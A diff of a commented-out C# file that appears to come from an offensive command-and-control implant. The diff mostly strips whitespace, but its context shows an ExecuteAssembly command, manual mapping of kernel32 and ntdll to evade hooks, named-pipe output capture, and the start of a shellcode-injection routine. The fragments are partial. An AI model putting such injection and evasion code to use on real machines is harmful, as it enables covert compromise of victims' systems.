@@ -18,10 +18,10 @@
 //    internal class ExecuteAssembly : EngineerCommand
 //    {
 //        public override string Name => "ExecuteAssembly";
-        
+
 //        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
 //        private string Output { get; set; } = "";
-//        public override string Execute(EngineerTask task)
+//        public override async Task Execute(EngineerTask task)
 //        {
 //            //get some variuables ready for spawning process
 //            var si = new WinAPIs.Kernel32.STARTUPINFOEX();
@@ -49,14 +49,14 @@
 //            // get the address of the saAttr
 //            IntPtr lpPipeAttributes = Marshal.AllocHGlobal(Marshal.SizeOf(saAttr));
 //            Marshal.StructureToPtr(saAttr, lpPipeAttributes, true);
-            
+
 
 //            //create a named pipe and use it to set Console.Out and Console.Error
 //            //var pipeHandle = WinAPIs.Kernel32.CreatePipe(out IntPtr outR_handle, out IntPtr outW_handle, ref saAttr, 0);
 //            var pipeHandle = WinAPIs.Kernel32.CreateNamedPipe(
 //               "\\\\.\\pipe\\EngineerPipe",
 //               WinAPIs.Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX | WinAPIs.Kernel32.PipeOpenModeFlags.FILE_FLAG_WRITE_THROUGH, WinAPIs.Kernel32.PipeModeFlags.PIPE_TYPE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_READMODE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_WAIT, 255, 65535, 65535, 0,ref saAttr);
-            
+
 
 //            if (pipeHandle == null)
 //            {
@@ -96,8 +96,8 @@
 //                {
 //                    //var hFile = new SafeFileHandle(outR_handle, false);
 //                    //Read from named pipe in chunks until there is no more data to read
-                    
-                    
+
+
 //                    var waitForSIngleParameters = new object[] { pi.hProcess, (uint)100 };
 //                    var processExited = false;
 //                    var NamedPipeDoneWaiting = false;
@@ -111,7 +111,7 @@
 //                        {
 //                            processExited = true;
 //                        }
-                        
+
 //                        //if (processExited)
 //                        //{
 //                        //    Console.WriteLine("reading from pipe");
@@ -150,7 +150,7 @@
 //        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
 //        {
 //            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
-            
+
 
 //            var hSection = IntPtr.Zero;
 //            var maxSize = (ulong)shellcode.Length;
